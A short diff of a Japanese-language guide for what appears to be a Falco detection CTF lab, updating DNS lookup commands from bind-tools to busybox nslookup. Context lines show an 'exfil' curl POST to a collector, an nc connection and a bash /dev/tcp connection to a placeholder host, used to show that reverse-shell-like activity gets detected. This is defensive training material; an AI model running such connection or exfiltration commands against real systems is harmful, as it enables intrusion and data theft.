@@ -171,9 +171,9 @@ curl -s -X POST "${FALCO_CTF_COLLECTOR}/api/challenges/<NN>-<slug>/exfil" \
 nc -v example.invalid 80
 bash -c 'exec 3<>/dev/tcp/example.invalid/80; echo done >&3'
 
-# DNS 調査(bind-tools)
-nslookup collector.collector.svc
-dig +short example.invalid
+# DNS 調査(busybox の nslookup)
+nslookup collector.collector.svc.cluster.local   # busybox は search ドメインを付けないので FQDN で
+nslookup example.invalid <server>   # DNS サーバを指定する場合
 ```
 
 !!! warning "リバースシェルは「見えて」います"
